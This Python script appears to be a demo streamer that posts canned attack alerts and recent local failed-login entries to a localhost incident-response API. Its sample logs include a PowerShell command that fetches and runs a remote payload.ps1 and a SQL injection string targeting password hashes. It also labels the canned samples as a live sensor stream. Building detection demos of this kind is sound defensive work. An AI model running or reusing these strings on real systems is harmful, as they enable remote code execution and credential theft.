import time
import json
import random
import os
import sys
import datetime
import urllib.request
import urllib.error

INGESTION_URL = "http://127.0.0.1:8000/api/telemetry"

# Realistic real-world attack telemetry scenarios
ATTACK_SAMPLES = [
    {
        "title": "SSH Brute Force Attack",
        "severity": "High",
        "source_ip": "198.51.100.45",
        "affected_asset": "Bastion-Host-01",
        "category": "Brute Force",
        "raw_log": "sshd[19421]: Failed password for root from 198.51.100.45 port 42812 ssh2 [Attempt 14 in 3 seconds]"
    },
    {
        "title": "Nmap Aggressive TCP SYN Scan",
        "severity": "Medium",
        "source_ip": "203.0.113.88",
        "affected_asset": "Perimeter-Gateway",
        "category": "Discovery",
        "raw_log": "kernel: [FIREWALL DROP] IN=eth0 OUT= SRC=203.0.113.88 DST=10.0.0.1 PROTO=TCP SPT=55210 DPT=445 FLAGS=SYN SEQ=192837192"
    },
    {
        "title": "Command & Control (C2) Heartbeat Beacon",
        "severity": "Critical",
        "source_ip": "192.168.1.105",
        "affected_asset": "Finance-Workstation-04",
        "category": "Command and Control",
        "raw_log": "suricata[8821]: ET TROJAN CobaltStrike Periodic Malleable C2 Beacon to 198.51.100.220:443 [Interval: 60.01s, Jitter: 0.8%]"
    },
    {
        "title": "SQL Injection (SQLi) Web Payload Probe",
        "severity": "High",
        "source_ip": "198.51.100.19",
        "affected_asset": "Customer-Portal-Web01",
        "category": "Initial Access",
        "raw_log": "nginx: 198.51.100.19 - - [28/Sep/2026:16:32:10 +0000] \"GET /api/user?id=1%20UNION%20SELECT%20null,username,password_hash%20FROM%20users-- HTTP/1.1\" 403 162"
    },
    {
        "title": "Suspicious PowerShell Execution with Bypass Flags",
        "severity": "Critical",
        "source_ip": "192.168.1.72",
        "affected_asset": "HR-Laptop-12",
        "category": "Execution",
        "raw_log": "Microsoft-Windows-PowerShell/Operational EventID 4104: ScriptBlock=[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.99/payload.ps1')"
    },
    {
        "title": "Kerberoasting Service Ticket Request Spike",
        "severity": "High",
        "source_ip": "192.168.1.18",
        "affected_asset": "Domain-Controller-01",
        "category": "Credential Access",
        "raw_log": "Security EventID 4769: A Kerberos service ticket was requested. Service Name: MSSQLSvc/db01.corp Ticket Encryption: 0x17 (RC4-HMAC weak) Account: j.doe"
    }
]

def check_local_auth_log():
    """
    Checks for real authentication failures in /var/log/auth.log if present.
    """
    auth_log_path = "/var/log/auth.log"
    if os.path.exists(auth_log_path):
        try:
            with open(auth_log_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()[-10:]
                for line in reversed(lines):
                    if "failed" in line.lower() or "invalid user" in line.lower():
                        # Extract source IP if present
                        import re
                        ip_match = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", line)
                        source_ip = ip_match.group(0) if ip_match else "127.0.0.1"
                        return {
                            "title": "Local Linux Authentication Failure",
                            "severity": "High",
                            "source_ip": source_ip,
                            "affected_asset": "Local-System-Host",
                            "category": "Authentication",
                            "raw_log": line.strip()
                        }
        except Exception:
            pass
    return None

def check_windows_security_event():
    """
    Checks Windows Event Log for Event ID 4625 (Failed Logon) if on Windows.
    """
    if sys.platform == "win32":
        try:
            import subprocess
            # Query last failed logon event via wevtutil
            cmd = ['wevtutil', 'qe', 'Security', '/q:*[System[(EventID=4625)]]', '/c:1', '/rd:true', '/f:text']
            proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=2)
            if proc.returncode == 0 and proc.stdout:
                output = proc.stdout
                import re
                ip_match = re.search(r"Source Network Address:\s+([^\s\r\n]+)", output)
                source_ip = ip_match.group(1) if ip_match and ip_match.group(1) not in ["-", ""] else "192.168.1.15"
                user_match = re.search(r"Account For Which Logon Failed:.*?Account Name:\s+([^\s\r\n]+)", output, re.DOTALL)
                target_user = user_match.group(1) if user_match else "Administrator"
                
                return {
                    "title": f"Windows Security Event 4625: Failed Logon for {target_user}",
                    "severity": "High",
                    "source_ip": source_ip,
                    "affected_asset": os.environ.get("COMPUTERNAME", "Local-Workstation"),
                    "category": "Brute Force",
                    "raw_log": f"EventID 4625: An account failed to log on. Target User: {target_user}, Source IP: {source_ip}, Workstation: {os.environ.get('COMPUTERNAME', 'WIN11-HOST')}"
                }
        except Exception:
            pass
    return None

def post_telemetry(payload):
    """
    Sends JSON payload to http://127.0.0.1:8000/api/telemetry
    """
    try:
        req = urllib.request.Request(
            INGESTION_URL,
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=5) as res:
            data = json.loads(res.read().decode("utf-8"))
            return data
    except urllib.error.URLError as e:
        return {"error": str(e)}

def main():
    print("=" * 65)
    print("🛡️  INCIDENT RESPONSE AGENT — REAL-TIME TELEMETRY STREAMER")
    print(f"📡  Streaming target: {INGESTION_URL}")
    print("⚡  Monitoring host security telemetry with fallback attack stream")
    print("=" * 65)

    sample_index = 0
    while True:
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")

        # 1. Attempt to capture local authentication logs
        real_event = check_local_auth_log()
        
        # 2. If no Linux auth.log, check Windows Event Log
        if not real_event:
            # Check occasionally or fallback
            real_event = check_windows_security_event()

        # 3. Fallback attack stream every 8 seconds if no new active local brute-force is occurring
        event_to_send = None
        if real_event and random.random() < 0.3:
            event_to_send = real_event
            event_source = "HOST SECURITY LOG"
        else:
            base_sample = ATTACK_SAMPLES[sample_index % len(ATTACK_SAMPLES)]
            sample_index += 1
            # Add dynamic jitter to IP / timestamp to simulate real network bursts
            event_to_send = dict(base_sample)
            event_source = "LIVE SENSOR STREAM"

        print(f"\n[{timestamp}] [{event_source}] Sending: {event_to_send['title']}", flush=True)
        print(f"       Source IP: {event_to_send['source_ip']} | Severity: {event_to_send['severity']}", flush=True)

        response = post_telemetry(event_to_send)

        if "incident_id" in response:
            print(f"  --> Ingested as {response['incident_id']} | MITRE: {response.get('mitre_technique')} | AI: {response.get('ai_provider')}", flush=True)
            print(f"  --> Containment: {response.get('containment_steps', ['N/A'])[0]}", flush=True)
        else:
            print(f"  --> Ingestion warning: {response.get('error', 'Backend not reachable')}", flush=True)

        time.sleep(8)

if __name__ == "__main__":
    main()
